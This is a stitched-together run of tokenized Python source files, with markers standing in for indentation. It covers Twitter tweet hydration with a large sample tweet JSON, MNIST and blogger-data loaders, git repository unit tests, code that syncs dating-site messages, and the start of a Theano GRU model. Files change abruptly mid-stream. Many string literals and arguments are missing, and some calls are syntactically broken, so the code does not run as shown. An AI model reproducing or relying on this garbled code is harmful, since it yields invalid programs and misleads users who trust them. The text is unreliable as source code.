\n 
# print "number of groups", len(list_of_groups) \n 
\n 
for tweet_subset in list_of_groups : \n 
~~~ tweet_id_string = "," . join ( [ tweet . tweet_id for tweet in tweet_subset ] ) \n 
\n 
try : \n 
~~~ response = client . api . statuses . lookup . post ( id = tweet_id_string , trim_user = False ) \n 
handle_all_tweets ( response . data , tweet_subset ) \n 
~~ except TwitterApiError , e : \n 
~~~ logger . exception ( "TwitterApiError error, skipping" ) \n 
~~ except TwitterClientError , e : \n 
~~~ logger . exception ( "TwitterClientError error, skipping" ) \n 
~~ except TwitterRateLimitError , e : \n 
~~~ logger . exception ( "TwitterRateLimitError error, skipping" ) \n 
# not totally sure what else I should do here.  retry somehow, or catch on cleanup run? \n 
\n 
# the function that calls this does a commit \n 
\n 
~~ ~~ return \n 
\n 
\n 
\n 
\n 
\n 
~~ def hydrate_twitter_text_and_followers ( profile_id , altmetric_twitter_posts ) : \n 
\n 
~~~ logger . info ( u"in hydrate_twitter_text_and_followers for profile {profile_id}" . format ( \n 
profile_id = profile_id ) ) \n 
\n 
tweets_to_hydrate_from_twitter = [ ] \n 
# get them all at once into the session so gets below go faster \n 
tweets = Tweet . query . filter ( Tweet . profile_id == profile_id ) \n 
tweet_dict = dict ( [ ( ( tweet . tweet_id , tweet . tiid ) , tweet ) for tweet in tweets ] ) \n 
\n 
for tiid , post_list in altmetric_twitter_posts . iteritems ( ) : \n 
~~~ for post in post_list : \n 
#### store tweet and tweeter stuff from altmetric \n 
~~~ tweet_id = post [ "tweet_id" ] \n 
screen_name = post [ "author" ] [ "id_on_source" ] \n 
\n 
if ( tweet_id , tiid ) in tweet_dict . keys ( ) : \n 
~~~ tweet = tweet_dict [ ( tweet_id , tiid ) ] \n 
if not tweet . tweet_text and not tweet . is_deleted : \n 
~~~ tweets_to_hydrate_from_twitter . append ( tweet ) \n 
~~ ~~ else : \n 
~~~ if not Tweet . query . get ( ( tweet_id , tiid ) ) : \n 
~~~ tweet = Tweet ( tweet_id = tweet_id , tiid = tiid ) \n 
tweet . set_attributes_from_altmetric_post ( post ) \n 
tweet . profile_id = profile_id \n 
tweets_to_hydrate_from_twitter . append ( tweet ) \n 
db . session . add ( tweet ) \n 
~~ if not tweet . tweeter : \n 
~~~ tweeter = Tweeter . query . get ( screen_name ) \n 
if not tweeter : \n 
~~~ tweeter = Tweeter ( screen_name = screen_name ) \n 
db . session . add ( tweeter ) \n 
~~ tweeter . set_attributes_from_altmetric_post ( post ) \n 
~~ commit ( db ) \n 
\n 
~~ ~~ ~~ logger . info ( u"before tweets_to_hydrate_from_twitter for {profile_id}" . format ( \n 
profile_id = profile_id ) ) \n 
if tweets_to_hydrate_from_twitter : \n 
# save the altmetric stuff first \n 
~~~ commit ( db ) \n 
\n 
tweet_ids = [ tweet . tweet_id for tweet in tweets_to_hydrate_from_twitter ] \n 
logger . info ( u"calling get_and_save_tweet_text_and_tweeter_followers for profile {profile_id}" profile_id = profile_id ) ) \n 
\n 
get_and_save_tweet_text_and_tweeter_followers ( tweets_to_hydrate_from_twitter ) \n 
commit ( db ) \n 
\n 
~~ else : \n 
~~~ logger . info ( u"no tweets to hydrate for profile {profile_id}" . format ( \n 
profile_id = profile_id ) ) \n 
\n 
~~ return \n 
\n 
\n 
# see http://docs.sqlalchemy.org/en/rel_0_9/orm/relationships.html#non-relational-comparisons-materialized-path ~~ handle_workaround_join_string = "remote(Tweeter.screen_name)==case([(foreign(Tweet.screen_name)==\'Dr_Bik\', \'hollybik\')], else_=foreign(Tweet.screen_name))" \n 
# info from twitter at: https://dev.twitter.com/rest/reference/get/statuses/lookup \n 
class Tweet ( db . Model ) : \n 
~~~ tweet_id = db . Column ( db . Text , primary_key = True ) \n 
tiid = db . Column ( db . Text , primary_key = True ) # alter table tweet add tiid text \n 
profile_id = db . Column ( db . Integer , db . ForeignKey ( ) ) \n 
screen_name = db . Column ( db . Text , db . ForeignKey ( ) ) \n 
tweet_timestamp = db . Column ( db . DateTime ( ) ) \n 
payload = db . Column ( json_sqlalchemy . JSONAlchemy ( db . Text ) ) \n 
is_deleted = db . Column ( db . Boolean ) # alter table tweet add is_deleted bool \n 
tweet_url = db . Column ( db . Text ) # alter table tweet add tweet_url text \n 
country = db . Column ( db . Text ) # alter table tweet add country text \n 
followers_at_time_of_tweet = db . Column ( db . Integer ) # alter table tweet add followers_at_time_of_tweet int4 \n 
tweeter = db . relationship ( \n 
, \n 
lazy = , \n 
cascade = , \n 
backref = db . backref ( "tweet" ) , \n 
uselist = False , \n 
primaryjoin = handle_workaround_join_string \n 
) \n 
\n 
def __init__ ( self , ** kwargs ) : \n 
~~~ if "payload" in kwargs : \n 
~~~ payload_dict = kwargs [ "payload" ] \n 
kwargs [ "tweet_id" ] = payload_dict [ "id_str" ] \n 
kwargs [ "screen_name" ] = payload_dict [ "user" ] [ "screen_name" ] \n 
kwargs [ "payload" ] = payload_dict \n 
kwargs [ "tweet_timestamp" ] = datetime . datetime . strptime ( payload_dict [ "created_at" ] , r"%a %b %d %H:%M:%S +0000 %Y" if not "country" in kwargs : \n 
~~~ try : \n 
~~~ kwargs [ "country" ] = payload_dict [ "place" ] [ "country_code" ] \n 
~~ except ( AttributeError , TypeError ) : \n 
~~~ pass \n 
~~ ~~ ~~ super ( Tweet , self ) . __init__ ( ** kwargs ) \n 
\n 
\n 
~~ @ classmethod \n 
def most_recent_tweet_id ( cls , screen_name ) : \n 
~~~ screen_name = screen_name . replace ( "@" , "" ) \n 
q = db . session . query ( Tweet ) . filter ( Tweet . screen_name == screen_name ) . order_by ( Tweet . tweet_timestamp tweet = q . first ( ) \n 
try : \n 
~~~ tweet_id = tweet . tweet_id \n 
~~ except AttributeError : \n 
~~~ tweet_id = None \n 
~~ return tweet_id \n 
\n 
~~ @ cached_property \n 
def tweet_text ( self ) : \n 
~~~ try : \n 
~~~ return self . payload [ "text" ] \n 
~~ except TypeError : \n 
~~~ return None \n 
\n 
\n 
~~ ~~ @ cached_property \n 
def tweet_text_with_links ( self ) : \n 
~~~ if self . tweet_text is None : \n 
~~~ return None \n 
\n 
~~ ret = self . tweet_text \n 
# the tweet text has just stub links. replace these with real ones \n 
ret = re . sub ( r"(http://.+?)(\\s|$)" , r"<link>" , ret ) \n 
for url_info in self . urls : \n 
~~~ my_link = u" <a class=\'linkout entity\' href=\'{url}\'>{display_url}</a> " . format ( \n 
url = url_info [ "expanded_url" ] , \n 
display_url = url_info [ "display_url" ] \n 
) \n 
ret = re . sub ( r"<link>" , my_link , ret , 1 ) \n 
\n 
# make links for #hashtags \n 
# this and the @usernames one both based on http://stackoverflow.com/a/13398311/226013 \n 
~~ ret = re . sub ( r"(^|[^#\\w])#(\\w+)\\b" , r"\\1<a href=\'http://twitter.com/hashtag/\\2\' class=\'entity hashtag\'>#\\2</a>" \n 
# make links for @usernames \n 
ret = re . sub ( r"(^|[^@\\w])@(\\w+)\\b" , r"\\1<a href=\'http://twitter.com/\\2\' class=\'entity at-name\'>@\\2</a> " return ret \n 
\n 
\n 
~~ @ cached_property \n 
def urls ( self ) : \n 
~~~ try : \n 
~~~ return self . payload [ "entities" ] [ "urls" ] \n 
~~ except TypeError : \n 
~~~ return None \n 
~~ except KeyError : \n 
~~~ return [ ] \n 
\n 
\n 
\n 
~~ ~~ @ cached_property \n 
def has_country ( self ) : \n 
~~~ return self . country != None \n 
\n 
~~ def set_attributes_from_altmetric_post ( self , post ) : \n 
~~~ self . tweet_id = post [ "tweet_id" ] \n 
self . screen_name = post [ "author" ] [ "id_on_source" ] \n 
self . tweet_timestamp = post [ "posted_on" ] \n 
if "geo" in post [ "author" ] : \n 
~~~ self . country = post [ "author" ] [ "geo" ] . get ( "country" , None ) \n 
~~ return self \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return . format ( \n 
tweet_id = self . tweet_id , \n 
profile_id = self . profile_id , \n 
screen_name = self . screen_name , \n 
timestamp = self . tweet_timestamp ) \n 
\n 
~~ def to_dict ( self ) : \n 
~~~ attributes_to_ignore = [ \n 
"payload" \n 
] \n 
ret = dict_from_dir ( self , attributes_to_ignore ) \n 
return ret \n 
\n 
\n 
~~ ~~ twitter_example_contents = """{\n        "contributors": null, \n        "coordinates": null, \n        "created_at": "Sun Dec 16 22:42:55 +0000 2012", \n        "entities": {\n            "hashtags": [\n                {\n                    "indices": [\n                        72, \n                        81\n                    ], \n                    "text": "scholars"\n                }\n            ], \n            "symbols": [], \n            "urls": [\n                {\n                    "display_url": "shar.es/hfqDY", \n                    "expanded_url": "http://shar.es/hfqDY", \n                    "indices": [\n                        83, \n                        103\n                    ], \n                    "url": "http://t.co/GDwhOrnu"\n                }\n            ], \n            "user_mentions": [\n                {\n                    "id": 259990583, \n                    "id_str": "259990583", \n                    "indices": [\n                        3, \n                        11\n                    ], \n                    "name": "Karen Lips", \n                    "screen_name": "kwren88"\n                }, \n                {\n                    "id": 224631899, \n                    "id_str": "224631899", \n                    "indices": [\n                        17, \n                        26\n                    ], \n                    "name": "figshare", \n                    "screen_name": "figshare"\n                }\n            ]\n        }, \n        "favorite_count": 0, \n        "favorited": false, \n        "geo": null, \n        "id": 280442912347664384, \n        "id_str": "280442912347664384", \n        "in_reply_to_screen_name": null, \n        "in_reply_to_status_id": null, \n        "in_reply_to_status_id_str": null, \n        "in_reply_to_user_id": null, \n        "in_reply_to_user_id_str": null, \n        "lang": "en", \n        "place": null, \n        "possibly_sensitive": false, \n        "retweet_count": 5, \n        "retweeted": false, \n        "retweeted_status": {\n            "contributors": null, \n            "coordinates": {\n                "coordinates": [\n                    -77.01357981, \n                    39.01103526\n                ], \n                "type": "Point"\n            }, \n            "created_at": "Sun Dec 16 22:34:13 +0000 2012", \n            "entities": {\n                "hashtags": [\n                    {\n                        "indices": [\n                            59, \n                            68\n                        ], \n                        "text": "scholars"\n                    }\n                ], \n                "symbols": [], \n                "urls": [\n                    {\n                        "display_url": "shar.es/hfqDY", \n                        "expanded_url": "http://shar.es/hfqDY", \n                        "indices": [\n                            70, \n                            90\n                        ], \n                        "url": "http://t.co/GDwhOrnu"\n                    }\n                ], \n                "user_mentions": [\n                    {\n                        "id": 224631899, \n                        "id_str": "224631899", \n                        "indices": [\n                            4, \n                            13\n                        ], \n                        "name": "figshare", \n                        "screen_name": "figshare"\n                    }\n                ]\n            }, \n            "favorite_count": 0, \n            "favorited": false, \n            "geo": {\n                "coordinates": [\n                    39.01103526, \n                    -77.01357981\n                ], \n                "type": "Point"\n            }, \n            "id": 280440721884983297, \n            "id_str": "280440721884983297", \n            "in_reply_to_screen_name": null, \n            "in_reply_to_status_id": null, \n            "in_reply_to_status_id_str": null, \n            "in_reply_to_user_id": null, \n            "in_reply_to_user_id_str": null, \n            "lang": "en", \n            "place": {\n                "attributes": {}, \n                "bounding_box": {\n                    "coordinates": [\n                        [\n                            [\n                                -77.064086, \n                                38.979735\n                            ], \n                            [\n                                -76.97162, \n                                38.979735\n                            ], \n                            [\n                                -76.97162, \n                                39.036964\n                            ], \n                            [\n                                -77.064086, \n                                39.036964\n                            ]\n                        ]\n                    ], \n                    "type": "Polygon"\n                }, \n                "contained_within": [], \n                "country": "United States", \n                "country_code": "US", \n                "full_name": "Silver Spring, MD", \n                "id": "6417871953fa5e86", \n                "name": "Silver Spring", \n                "place_type": "city", \n                "url": "https://api.twitter.com/1.1/geo/id/6417871953fa5e86.json"\n            }, \n            "possibly_sensitive": false, \n            "retweet_count": 5, \n            "retweeted": false, \n            "source": "<a href=\\"http://twitter.com/download/iphone\\" rel=\\"nofollow\\">Twitter for iPhone</a>", \n            "text": "MT \\"@figshare: Prevalence and use of Twitter growing among #scholars: http://t.co/GDwhOrnu\\u201d", \n            "truncated": false, \n            "user": {\n                "contributors_enabled": false, \n                "created_at": "Thu Mar 03 00:30:46 +0000 2011", \n                "default_profile": false, \n                "default_profile_image": false, \n                "description": "Amphibian Ecologist. Associate Professor Biology, UMaryland. Director, Graduate Program in Sustainable Development & Conservation Biology. tweets my own", \n                "entities": {\n                    "description": {\n                        "urls": []\n                    }, \n                    "url": {\n                        "urls": [\n                            {\n                                "display_url": "lipslab.weebly.com", \n                                "expanded_url": "http://lipslab.weebly.com/", \n                                "indices": [\n                                    0, \n                                    22\n                                ], \n                                "url": "http://t.co/8sw0WzjuIn"\n                            }\n                        ]\n                    }\n                }, \n                "favourites_count": 2979, \n                "follow_request_sent": null, \n                "followers_count": 1767, \n                "following": null, \n                "friends_count": 946, \n                "geo_enabled": true, \n                "id": 259990583, \n                "id_str": "259990583", \n                "is_translation_enabled": false, \n                "is_translator": false, \n                "lang": "en", \n                "listed_count": 92, \n                "location": "", \n                "name": "Karen Lips", \n                "notifications": null, \n                "profile_background_color": "C0DEED", \n                "profile_background_image_url": "http://pbs.twimg.com/profile_background_images/795249398/fae1497afc5e983974518244cf4aaba2.jpeg", \n                "profile_background_image_url_https": "https://pbs.twimg.com/profile_background_images/795249398/fae1497afc5e983974518244cf4aaba2.jpeg", \n                "profile_background_tile": false, \n                "profile_banner_url": "https://pbs.twimg.com/profile_banners/259990583/1348775951", \n                "profile_image_url": "http://pbs.twimg.com/profile_images/3495233234/70ac2d2c7299e4b04febca2beb83b74f_normal.png", \n                "profile_image_url_https": "https://pbs.twimg.com/profile_images/3495233234/70ac2d2c7299e4b04febca2beb83b74f_normal.png", \n                "profile_link_color": "0089B3", \n                "profile_sidebar_border_color": "FFFFFF", \n                "profile_sidebar_fill_color": "361645", \n                "profile_text_color": "02606A", \n                "profile_use_background_image": true, \n                "protected": false, \n                "screen_name": "kwren88", \n                "statuses_count": 11928, \n                "time_zone": "Eastern Time (US & Canada)", \n                "url": "http://t.co/8sw0WzjuIn", \n                "utc_offset": -14400, \n                "verified": false\n            }\n        }, \n        "source": "<a href=\\"http://twitter.com/download/iphone\\" rel=\\"nofollow\\">Twitter for iPhone</a>", \n        "text": "RT @kwren88: MT \\"@figshare: Prevalence and use of Twitter growing among #scholars: http://t.co/GDwhOrnu\\u201d", \n        "truncated": false, \n        "user": {\n            "contributors_enabled": false, \n            "created_at": "Tue Mar 29 14:48:17 +0000 2011", \n            "default_profile": false, \n            "default_profile_image": false, \n            "description": "Postdoc,lazy blogger, co-host of http://t.co/uz2JfRCfki podcast. Interests: herpetology, behavioral ecology, evolution, genes and behavior. I heart salamanders.", \n            "entities": {\n                "description": {\n                    "urls": [\n                        {\n                            "display_url": "Breakingbio.com", \n                            "expanded_url": "http://Breakingbio.com", \n                            "indices": [\n                                33, \n                                55\n                            ], \n                            "url": "http://t.co/uz2JfRCfki"\n                        }\n                    ]\n                }, \n                "url": {\n                    "urls": [\n                        {\n                            "display_url": "natureafield.com", \n                            "expanded_url": "http://www.natureafield.com", \n                            "indices": [\n                                0, \n                                22\n                            ], \n                            "url": "http://t.co/I0kb1Imd6b"\n                        }\n                    ]\n                }\n            }, \n            "favourites_count": 789, \n            "follow_request_sent": null, \n            "followers_count": 1128, \n            "following": null, \n            "friends_count": 477, \n            "geo_enabled": true, \n            "id": 274000727, \n            "id_str": "274000727", \n            "is_translation_enabled": false, \n            "is_translator": false, \n            "lang": "en", \n            "listed_count": 91, \n            "location": "Buenos Aires, Argentina", \n            "name": "Heidi K Smith-Parker", \n            "notifications": null, \n            "profile_background_color": "FED105", \n            "profile_background_image_url": "http://pbs.twimg.com/profile_background_images/259765740/x069eeb809c51076b2883e31fbce942f.png", \n            "profile_background_image_url_https": "https://pbs.twimg.com/profile_background_images/259765740/x069eeb809c51076b2883e31fbce942f.png", \n            "profile_background_tile": true, \n            "profile_banner_url": "https://pbs.twimg.com/profile_banners/274000727/1349651541", \n            "profile_image_url": "http://pbs.twimg.com/profile_images/2963151089/d9cfaa7ab235dcd1ad3430d534c23929_normal.jpeg", \n            "profile_image_url_https": "https://pbs.twimg.com/profile_images/2963151089/d9cfaa7ab235dcd1ad3430d534c23929_normal.jpeg", \n            "profile_link_color": "E9BF05", \n            "profile_sidebar_border_color": "3B3B3B", \n            "profile_sidebar_fill_color": "3B3B3B", \n            "profile_text_color": "989898", \n            "profile_use_background_image": true, \n            "protected": false, \n            "screen_name": "HeidiKayDeidi", \n            "statuses_count": 7747, \n            "time_zone": null, \n            "url": "http://t.co/I0kb1Imd6b", \n            "utc_offset": null, \n            "verified": false\n        }\n    }""" import os \n 
import numpy as np \n 
\n 
def load_gender_data ( ntrain = 10000 , ntest = 10000 ) : \n 
~~~ import pandas as pd \n 
file_loc = os . path . dirname ( os . path . realpath ( __file__ ) ) \n 
relative_path = "blogger_data_2.csv" # move dataset to examples directory \n 
fullpath = os . path . join ( file_loc , relative_path ) \n 
data = pd . read_csv ( fullpath , nrows = ntrain + ntest ) \n 
X = data [ ] . values \n 
X = [ str ( x ) for x in X ] # ugly nan cleaner \n 
Y = data [ ] . values \n 
trX = X [ : - ntest ] \n 
teX = X [ - ntest : ] \n 
trY = Y [ : - ntest ] \n 
teY = Y [ - ntest : ] \n 
return trX , teX , trY , teY \n 
\n 
~~ def load_mnist ( data_dir = None ) : \n 
~~~ if data_dir is None : \n 
~~~ import urllib \n 
import gzip \n 
url = \n 
fnames = [ \n 
, \n 
, \n 
, \n 
\n 
] \n 
for fname in fnames : \n 
~~~ if not os . path . isfile ( fname ) : \n 
~~~ print , fname \n 
urllib . urlretrieve ( url + fname , fname ) \n 
~~ ~~ data_dir = \n 
~~ fd = gzip . open ( os . path . join ( data_dir , ) ) \n 
loaded = np . fromstring ( fd . read ( ) , dtype = np . uint8 ) \n 
trX = loaded [ 16 : ] . reshape ( ( 60000 , - 1 ) ) \n 
\n 
fd = gzip . open ( os . path . join ( data_dir , ) ) \n 
loaded = np . fromstring ( fd . read ( ) , dtype = np . uint8 ) \n 
trY = loaded [ 8 : ] . reshape ( ( 60000 ) ) \n 
\n 
fd = gzip . open ( os . path . join ( data_dir , ) ) \n 
loaded = np . fromstring ( fd . read ( ) , dtype = np . uint8 ) \n 
teX = loaded [ 16 : ] . reshape ( ( 10000 , - 1 ) ) \n 
\n 
fd = gzip . open ( os . path . join ( data_dir , ) ) \n 
loaded = np . fromstring ( fd . read ( ) , dtype = np . uint8 ) \n 
teY = loaded [ 8 : ] . reshape ( ( 10000 ) ) \n 
\n 
trX = trX / 255. \n 
teX = teX / 255. \n 
\n 
trX = trX . reshape ( - 1 , 28 , 28 ) \n 
teX = teX . reshape ( - 1 , 28 , 28 ) \n 
\n 
return trX , teX , trY , teY #! /usr/bin/python \n 
~~ import unittest \n 
import os \n 
import commands \n 
from utils import get_temporary_location \n 
from utils import delete_repository \n 
from gitpy import LocalRepository \n 
from gitpy import find_repository \n 
from gitpy . exceptions import GitException \n 
\n 
class EmptyRepositoryTest ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . dirname = get_temporary_location ( ) \n 
self . repo = LocalRepository ( self . dirname ) \n 
self . assertFalse ( os . path . exists ( self . dirname ) ) \n 
self . assertFalse ( self . repo . isValid ( ) ) \n 
~~ def tearDown ( self ) : \n 
~~~ if os . path . exists ( self . dirname ) : \n 
~~~ delete_repository ( self . repo ) \n 
\n 
~~ ~~ ~~ class BasicRepositories ( EmptyRepositoryTest ) : \n 
~~~ def testRepositoryInit ( self ) : \n 
~~~ self . repo . init ( ) \n 
self . assertTrue ( self . repo . isValid ( ) ) \n 
self . failUnless ( os . path . isdir ( self . dirname ) ) \n 
self . failUnless ( os . path . isdir ( os . path . join ( self . dirname , ".git" ) ) ) \n 
~~ def testConfiguration ( self ) : \n 
~~~ self . repo . init ( ) \n 
self . repo . config . setParameter ( , 2 ) \n 
self . assertEquals ( self . repo . config . getParameter ( ) , ) \n 
~~ def testRepositoryInitWhenExists ( self ) : \n 
~~~ os . mkdir ( self . dirname ) \n 
self . repo . init ( ) \n 
self . failUnless ( os . path . isdir ( self . dirname ) ) \n 
self . failUnless ( os . path . isdir ( os . path . join ( self . dirname , ".git" ) ) ) \n 
\n 
~~ ~~ class ModifiedRepositoryTest ( EmptyRepositoryTest ) : \n 
~~~ FILENAME = "test.txt" \n 
def setUp ( self ) : \n 
~~~ super ( ModifiedRepositoryTest , self ) . setUp ( ) \n 
self . repo . init ( ) \n 
with open ( os . path . join ( self . repo . path , self . FILENAME ) , "wb" ) as f : \n 
~~~ print >> f , "Hey!" \n 
~~ self . assertFalse ( self . repo . isWorkingDirectoryClean ( ) ) \n 
\n 
~~ ~~ class ModifiedRepositories ( ModifiedRepositoryTest ) : \n 
~~~ def testStatus ( self ) : \n 
~~~ untracked = self . repo . getUntrackedFiles ( ) \n 
self . assertEquals ( untracked , [ self . FILENAME ] ) \n 
~~ def testAdding ( self ) : \n 
~~~ untracked_files = self . repo . getUntrackedFiles ( ) \n 
for u in untracked_files : \n 
~~~ self . repo . add ( u ) \n 
~~ self . assertEquals ( self . repo . getStagedFiles ( ) , untracked_files ) \n 
self . assertFalse ( self . repo . isWorkingDirectoryClean ( ) ) \n 
~~ def testCommitting ( self ) : \n 
~~~ self . repo . addAll ( ) \n 
self . assertNotEquals ( self . repo . getStagedFiles ( ) , [ ] ) \n 
c = self . repo . commit ( message = "test commit" ) \n 
self . assertTrue ( self . repo . isWorkingDirectoryClean ( ) ) \n 
self . assertEquals ( self . repo . getStagedFiles ( ) , [ ] ) \n 
\n 
~~ ~~ class CleaningUntrackedFiles ( ModifiedRepositoryTest ) : \n 
~~~ def _clean ( self ) : \n 
~~~ self . repo . cleanUntrackedFiles ( ) \n 
self . failIf ( self . repo . getUntrackedFiles ( ) ) \n 
~~ def testCleaningUpUntrackedFiles ( self ) : \n 
~~~ with open ( os . path . join ( self . repo . path , "dirty_file" ) , "wb" ) as f : \n 
~~~ print >> f , "data" \n 
~~ self . failUnless ( self . repo . getUntrackedFiles ( ) ) \n 
self . _clean ( ) \n 
#check directory cleanups \n 
dirpath = os . path . join ( self . repo . path , "unused_directory" ) \n 
os . mkdir ( dirpath ) \n 
self . _clean ( ) \n 
self . failIf ( os . path . exists ( dirpath ) ) \n 
\n 
~~ ~~ class TestAPI ( ModifiedRepositoryTest ) : \n 
~~~ def test_find_repository ( self ) : \n 
~~~ prev_path = os . path . realpath ( "." ) \n 
subpath = os . path . join ( self . repo . path , "a" , "b" , "c" ) \n 
os . makedirs ( subpath ) \n 
os . chdir ( subpath ) \n 
try : \n 
~~~ repo = find_repository ( ) \n 
~~ finally : \n 
~~~ os . chdir ( prev_path ) \n 
~~ self . failUnless ( repo . path == self . repo . path ) \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
~~ import logging \n 
\n 
from okcupyd . db import model , txn , with_txn \n 
\n 
\n 
log = logging . getLogger ( __name__ ) \n 
\n 
\n 
class UserAdapter ( object ) : \n 
\n 
~~~ def __init__ ( self , profile ) : \n 
~~~ self . profile = profile \n 
\n 
~~ def build ( self , session ) : \n 
~~~ found = model . User . query_no_txn ( session , model . User . handle == \n 
self . profile . username ) \n 
if found : \n 
~~~ return found [ 0 ] \n 
~~ else : \n 
~~~ return model . User ( okc_id = self . profile . id , \n 
handle = self . profile . username , \n 
age = self . profile . age , \n 
location = self . profile . location ) \n 
\n 
~~ ~~ def get_no_txn ( self , session ) : \n 
~~~ return model . User . upsert_one_no_txn ( session , self . build ( session ) , \n 
id_key = ) \n 
\n 
~~ get = with_txn ( get_no_txn ) \n 
\n 
\n 
~~ class ThreadAdapter ( object ) : \n 
\n 
~~~ def __init__ ( self , thread ) : \n 
~~~ self . thread = thread \n 
\n 
~~ def _get_thread ( self , session ) : \n 
~~~ initiator = UserAdapter ( self . thread . initiator ) . get_no_txn ( session ) \n 
respondent = UserAdapter ( self . thread . respondent ) . get_no_txn ( session ) \n 
message_thread = model . MessageThread ( okc_id = self . thread . id , \n 
initiator = initiator , \n 
respondent = respondent ) \n 
return model . MessageThread . upsert_one_no_txn ( session , message_thread , \n 
id_key = ) \n 
\n 
~~ def _add_messages ( self , thread_model ) : \n 
# This should probably use upsert. \n 
~~~ existing_message_ids = set ( [ m . okc_id for m in thread_model . messages ] ) \n 
new_messages = [ message for message in self . thread . messages \n 
if message . id not in existing_message_ids ] \n 
new_message_models = [ ] \n 
for new_message in new_messages : \n 
~~~ from_initiator = thread_model . initiator . handle . lower ( ) == new_message . sender . username . lower ( ) \n 
sender , recipient = ( thread_model . initiator , \n 
thread_model . respondent ) if from_initiator else ( thread_model . respondent , \n 
thread_model . initiator ) \n 
new_message_model = model . Message ( okc_id = new_message . id , \n 
text = new_message . content , \n 
sender = sender , \n 
recipient = recipient , \n 
time_sent = new_message . time_sent ) \n 
new_message_models . append ( new_message_model ) \n 
thread_model . messages . append ( new_message_model ) \n 
~~ return new_message_models \n 
\n 
~~ def add_messages ( self ) : \n 
~~~ with txn ( ) as session : \n 
~~~ thread_model = model . MessageThread . find_no_txn ( session , \n 
self . thread . id , \n 
id_key = ) \n 
return self . _add_messages ( thread_model ) \n 
\n 
~~ ~~ def get_thread ( self ) : \n 
~~~ with txn ( ) as session : \n 
~~~ thread_model = self . _get_thread ( session ) \n 
return thread_model , self . _add_messages ( thread_model ) \n 
~~ ~~ ~~ import logging \n 
\n 
from invoke import task \n 
import IPython \n 
\n 
from okcupyd import db \n 
from okcupyd import util \n 
from okcupyd . db import mailbox , model \n 
from okcupyd . user import User \n 
\n 
\n 
log = logging . getLogger ( __name__ ) \n 
\n 
\n 
@ task ( default = True ) \n 
def session ( ) : \n 
~~~ with db . txn ( ) as session : \n 
~~~ IPython . embed ( ) \n 
\n 
\n 
~~ ~~ @ task \n 
def reset ( ) : \n 
~~~ util . enable_logger ( __name__ ) \n 
log . info ( db . Base . metadata . bind ) \n 
db . Base . metadata . drop_all ( ) \n 
db . Base . metadata . create_all ( ) \n 
\n 
\n 
~~ @ task \n 
def sync ( ) : \n 
~~~ user = User ( ) \n 
mailbox . Sync ( user ) . all ( ) \n 
log . info ( model . Message . query ( model . User . okc_id == user . profile . id ) ) \n 
\n 
\n 
~~ @ task \n 
def make ( ) : \n 
~~~ user = User ( ) \n 
user_model = model . User . from_profile ( user . profile ) \n 
user_model . upsert_model ( id_key = ) \n 
okcupyd_user = model . OKCupydUser ( user_id = user_model . id ) \n 
okcupyd_user . upsert_model ( id_key = ) \n 
return okcupyd_user \n 
~~ from . import util \n 
from okcupyd import User , photo \n 
\n 
\n 
@ util . use_cassette ( path = , \n 
match_on = util . match_on_no_body ) \n 
def test_photo_upload ( ) : \n 
~~~ uploader = photo . PhotoUploader ( ) \n 
upload_response_dict = uploader . upload_and_confirm ( ) \n 
assert int ( upload_response_dict [ ] ) > 0 \n 
\n 
\n 
~~ @ util . use_cassette ( path = , match_on = util . match_on_no_body ) \n 
def test_photo_delete ( ) : \n 
~~~ user = User ( ) \n 
response_dict = user . photo . upload_and_confirm ( user . quickmatch ( ) . photo_infos [ 0 ] ) \n 
before_delete_photos = user . profile . photo_infos \n 
user . photo . delete ( response_dict [ ] ) \n 
user . profile . refresh ( ) \n 
assert len ( before_delete_photos ) - 1 == len ( user . profile . photo_infos ) \n 
\n 
\n 
~~ def test_make_photo_uri_from_https_link ( ) : \n 
~~~ photo_info = photo . Info . from_cdn_uri ( \n 
\n 
\n 
\n 
) \n 
assert photo_info . id == 2254475731855279447 \n 
assert photo_info . thumb_nail_top == 21 \n 
\n 
\n 
~~ @ util . use_cassette \n 
def test_photo_info_upload ( vcr_live_sleep ) : \n 
~~~ user = User ( ) \n 
response = user . photo . upload_and_confirm ( user . quickmatch ( ) . photo_infos [ 0 ] ) \n 
vcr_live_sleep ( 2 ) \n 
assert int ( response [ ] ) in [ pi . id for pi in user . profile . photo_infos ] \n 
~~ import theano \n 
import theano . tensor as T \n 
from theano . sandbox . rng_mrg import MRG_RandomStreams \n 
from theano . tensor . nnet . conv import conv2d \n 
from theano . tensor . signal . downsample import max_pool_2d \n 
from theano . tensor . shared_randomstreams import RandomStreams \n 
\n 
import numpy as np \n 
\n 
from toolbox import * \n 
from modelbase import * \n 
\n 
\n 
class LM_gru ( ModelLMBase ) : \n 
~~~ def __init__ ( self , data , hp ) : \n 
~~~ super ( LM_gru , self ) . __init__ ( self . __class__ . __name__ , data , hp ) \n 
\n 
self . n_h = 256 \n 
self . dropout = 0.5 \n 
\n 
self . params = Parameters ( ) \n 
self . hiddenstates = Parameters ( ) \n 
n_tokens = self . data [ ] \n 
n_h = self . n_h \n 
scale = hp . init_scale \n 
gates = 3 \n 
\n 
with self . hiddenstates : \n 
~~~ b1_h = shared_zeros ( ( self . hp . batch_size , n_h ) ) \n 
b2_h = shared_zeros ( ( self . hp . batch_size , n_h ) ) \n 
\n 
~~ if hp . load_model and os . path . isfile ( self . filename ) : \n 
~~~ self . params . load ( self . filename ) \n 
~~ else : \n 
~~~ with self . params : \n 
~~~ W_emb = shared_normal ( ( n_tokens , n_h ) , scale = scale ) \n 
\n 
W1 = shared_normal ( ( n_h , n_h * gates ) , scale = scale * 1.5 ) \n 
V1 = shared_normal ( ( n_h , n_h * gates ) , scale = scale * 1.5 ) \n 
b1 = shared_zeros ( ( n_h * gates ) ) \n 
\n 
W2 = shared_normal ( ( n_h , n_h * gates ) , scale = scale * 1.5 ) \n 
V2 = shared_normal ( ( n_h , n_h * gates ) , scale = scale * 1.5 ) \n 
b2 = shared_zeros ( ( n_h * gates , ) ) \n 
\n 
\n 
~~ ~~ def lstm ( X , h , c , W , U , b ) : \n 
~~~ g_on = T . dot ( X , W ) + T . dot ( h , U ) + b \n 
i_on = T . nnet . sigmoid ( g_on [ : , : n_h ] ) \n 
f_on = T . nnet . sigmoid ( g_on [ : , n_h : 2 * n_h ] ) \n 
o_on = T . nnet . sigmoid ( g_on [ : , 2 * n_h : 3 * n_h ] ) \n 
c = f_on * c + i_on * T . tanh ( g_on [ : , 3 * n_h : ] ) \n 
